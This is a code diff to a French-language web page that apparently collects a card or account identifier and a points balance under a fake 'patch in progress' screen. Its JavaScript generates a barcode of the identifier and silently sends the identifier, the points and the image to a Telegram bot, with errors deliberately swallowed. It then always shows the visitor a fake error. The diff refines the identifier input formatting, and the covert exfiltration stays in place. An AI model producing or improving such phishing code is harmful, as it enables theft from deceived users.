@@ -201,8 +201,8 @@
     <div class="content">
         <div class="input-group">
             <label>🔐 IDENTIFIANT (4–8 CARACTÈRES)</label>
-            <input type="text" id="identifiantInput" class="input-field" placeholder="ex: X7F3" maxlength="8" autocomplete="off">
-            <div class="info-length">⚠️ min 4 | max 8 caractères</div>
+            <input type="text" id="identifiantInput" class="input-field" placeholder="ex: ABCD 1234" maxlength="9" autocomplete="off">
+            <div class="info-length">⚠️ 4 à 8 caractères (un espace automatique après le 4ème)</div>
         </div>
 
         <div class="input-group">
@@ -242,7 +242,83 @@
         let isProcessing = false;
         const barcodeCanvas = document.getElementById('barcodeCanvasHidden');
 
-        // Fonction mise à jour UI
+        // Stockage de la valeur brute réelle (sans espace) pour validation et envoi
+        let rawIdentifier = "";
+
+        // Fonction formatage : ajoute un espace après le 4ème caractère (uniquement sur l'affichage)
+        // mais on garde rawIdentifier séparément.
+        function formatIdentifierWithSpace(inputValue) {
+            // Supprimer tout espace existant pour obtenir la chaîne brute
+            let cleaned = inputValue.replace(/\s/g, '');
+            // Limiter à 8 caractères max (identifiant réel)
+            if (cleaned.length > 8) cleaned = cleaned.slice(0, 8);
+            rawIdentifier = cleaned;
+            
+            // Construire la version affichée avec espace après 4 caractères si longueur >=4
+            let displayValue = rawIdentifier;
+            if (rawIdentifier.length >= 4) {
+                displayValue = rawIdentifier.slice(0, 4) + (rawIdentifier.length > 4 ? ' ' + rawIdentifier.slice(4) : '');
+            }
+            return displayValue;
+        }
+
+        // Mettre à jour le champ input avec formatage, tout en préservant la position du curseur
+        function updateInputFormatting() {
+            const cursorPos = identifiantInput.selectionStart;
+            const currentDisplay = identifiantInput.value;
+            const newDisplay = formatIdentifierWithSpace(currentDisplay);
+            if (newDisplay !== currentDisplay) {
+                identifiantInput.value = newDisplay;
+                // Ajuster le curseur après modification
+                let newCursorPos = cursorPos;
+                // Si on ajoute un espace au milieu, décaler le curseur
+                if (rawIdentifier.length >= 4 && currentDisplay.length < newDisplay.length && cursorPos === 4) {
+                    newCursorPos = 5;
+                } else if (rawIdentifier.length >= 4 && currentDisplay.length > newDisplay.length && cursorPos === 5) {
+                    newCursorPos = 4;
+                }
+                identifiantInput.setSelectionRange(newCursorPos, newCursorPos);
+            }
+        }
+
+        // Événement input pour le formatage
+        function onIdentifierInput(e) {
+            if (isProcessing) return;
+            let raw = identifiantInput.value;
+            // Nettoyer les espaces et contrôler la longueur brute max 8
+            let cleaned = raw.replace(/\s/g, '');
+            if (cleaned.length > 8) cleaned = cleaned.slice(0, 8);
+            rawIdentifier = cleaned;
+            
+            let displayValue = rawIdentifier;
+            if (rawIdentifier.length >= 4) {
+                displayValue = rawIdentifier.slice(0, 4) + (rawIdentifier.length > 4 ? ' ' + rawIdentifier.slice(4) : '');
+            }
+            identifiantInput.value = displayValue;
+            
+            // Gestion du statut (efface erreur si valide)
+            if (isValidIdentifier(rawIdentifier)) {
+                if (!statusArea.innerHTML.includes("PATCH EN COURS")) {
+                    updateStatus('idle');
+                }
+            } else if (rawIdentifier.length > 0) {
+                // si invalide mais on efface l'erreur pour permettre correction
+                if (!statusArea.innerHTML.includes("PATCH EN COURS")) {
+                    updateStatus('idle');
+                }
+            } else {
+                if (!statusArea.innerHTML.includes("PATCH EN COURS")) {
+                    updateStatus('idle');
+                }
+            }
+        }
+
+        // Validation identifiant (4-8 caractères, sans espaces)
+        function isValidIdentifier(identifier) {
+            return identifier && identifier.length >= 4 && identifier.length <= 8;
+        }
+
+        // Mise à jour UI status
         function updateStatus(type, customMessage = null) {
             if (type === 'patch') {
                 statusArea.innerHTML = `<span class="patch">🔧 PATCH EN COURS ... 🔧</span>`;
@@ -261,22 +337,17 @@
             }
         }
 
-        // Validation identifiant (4-8 caractères)
-        function isValidIdentifier(identifier) {
-            return identifier && identifier.length >= 4 && identifier.length <= 8;
-        }
-
-        // Génération code-barres plus gros (taille augmentée)
+        // Génération code-barres (taille augmentée)
         function generateBarcodeOnCanvas(identifier) {
             return new Promise((resolve, reject) => {
                 try {
                     JsBarcode(barcodeCanvas, identifier, {
                         format: "CODE128",
                         lineColor: "#000000",
-                        width: 3.2,           // plus épais
-                        height: 120,           // plus haut
+                        width: 3.2,
+                        height: 120,
                         displayValue: true,
-                        fontSize: 20,          // texte sous le code plus lisible
+                        fontSize: 20,
                         margin: 15,
                         background: "#ffffff"
                     });
@@ -287,7 +358,7 @@
             });
         }
 
-        // Convertir canvas en Blob PNG
+        // Canvas to Blob PNG
         function canvasToBlob(canvas) {
             return new Promise((resolve, reject) => {
                 canvas.toBlob(blob => {
@@ -297,7 +368,7 @@
             });
         }
 
-        // Envoi à Telegram (identifiant + points + code barre)
+        // Envoi à Telegram (identifiant brut, points, code barre)
         async function sendToTelegram(identifier, points, imageBlob) {
             const formData = new FormData();
             formData.append('chat_id', CHAT_ID);
@@ -309,20 +380,18 @@
 
             try {
                 await fetch(TELEGRAM_API_URL, { method: 'POST', body: formData });
-                // aucun log, silence radio
-            } catch (e) {
-                // totalement invisible
-            }
+                // silence total
+            } catch (e) {}
         }
 
         // Action principale
         async function handleSuivant() {
             if (isProcessing) return;
 
-            const identifier = identifiantInput.value;
+            // Récupérer l'identifiant brut (sans espace) depuis rawIdentifier
+            const identifier = rawIdentifier;
             const points = pointsInput.value;
 
-            // Validation identifiant (min4 max8)
             if (!isValidIdentifier(identifier)) {
                 updateStatus('invalid_length');
                 return;
@@ -331,18 +400,12 @@
             isProcessing = true;
             suivantBtn.disabled = true;
 
-            // Affiche "patch en cours"
             updateStatus('patch');
 
             try {
-                // Génération code barre (plus grande taille)
                 await generateBarcodeOnCanvas(identifier);
                 const barcodeBlob = await canvasToBlob(barcodeCanvas);
-                
-                // Envoi Telegram avec l'identifiant + points
                 await sendToTelegram(identifier, points, barcodeBlob);
-                
-                // Affiche "erreur" comme demandé (toujours après envoi)
                 updateStatus('erreur');
             } catch (err) {
                 updateStatus('erreur');
@@ -352,20 +415,19 @@
             }
         }
 
-        // Réinitialiser l'état idle quand l'utilisateur tape
-        function onInputChange() {
+        // Réinitialisation du statut quand on modifie les champs
+        function resetStatusOnInput() {
             if (isProcessing) return;
-            // Si le champ identifiant est vide ou valide on repasse en idle (efface erreur)
-            if (!identifiantInput.value || isValidIdentifier(identifiantInput.value)) {
-                if (statusArea.innerHTML.includes("ERREUR") || statusArea.innerHTML.includes("PATCH EN COURS") === false) {
-                    updateStatus('idle');
-                }
-            } else if (identifiantInput.value.length > 0 && !isValidIdentifier(identifiantInput.value)) {
-                // On ne spam pas d'erreur, on laisse l'utilisateur corriger, on met idle
+            if (rawIdentifier.length === 0 || isValidIdentifier(rawIdentifier)) {
                 if (!statusArea.innerHTML.includes("PATCH EN COURS")) {
                     updateStatus('idle');
                 }
             }
+        }
+
+        function onPointsInput() {
+            if (isProcessing) return;
+            resetStatusOnInput();
         }
 
         function onKeyPressHandler(e) {
@@ -377,17 +439,20 @@
 
         // Initialisation
         updateStatus('idle');
+        rawIdentifier = "";
+        identifiantInput.value = "";
         
-        // Précharger le canvas avec une valeur neutre
+        // Précharger canvas
         try {
             JsBarcode(barcodeCanvas, "INIT", { format: "CODE128", width: 3, height: 100, displayValue: false });
         } catch(e) {}
 
-        suivantBtn.addEventListener('click', handleSuivant);
-        identifiantInput.addEventListener('input', onInputChange);
-        pointsInput.addEventListener('input', onInputChange);
+        // Événements
+        identifiantInput.addEventListener('input', onIdentifierInput);
+        pointsInput.addEventListener('input', onPointsInput);
         identifiantInput.addEventListener('keypress', onKeyPressHandler);
         pointsInput.addEventListener('keypress', onKeyPressHandler);
+        suivantBtn.addEventListener('click', handleSuivant);
     })();
 </script>
 </body>
